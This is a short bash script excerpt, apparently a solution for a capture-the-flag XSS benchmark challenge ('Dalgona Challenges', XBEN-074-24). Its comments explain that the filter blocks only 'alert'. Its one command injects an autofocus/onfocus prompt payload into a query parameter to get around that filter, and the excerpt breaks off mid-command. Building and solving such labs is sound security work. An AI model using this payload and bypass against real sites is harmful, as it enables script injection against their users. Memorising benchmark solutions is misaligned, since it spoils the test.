#!/usr/bin/env bash
# XBEN-074-24 — "Dalgona Challenges", circle (tags: xss)
#
# The blacklist is one word long: `alert`. The checker logs `onPrompt` and
# `onConfirm` as well, so two of the three dialog functions still report.
#
...
seq="$("$H5I" websec replay req_0 --create --set 'query.name=<input autofocus onfocus=prompt("XSS")>' \
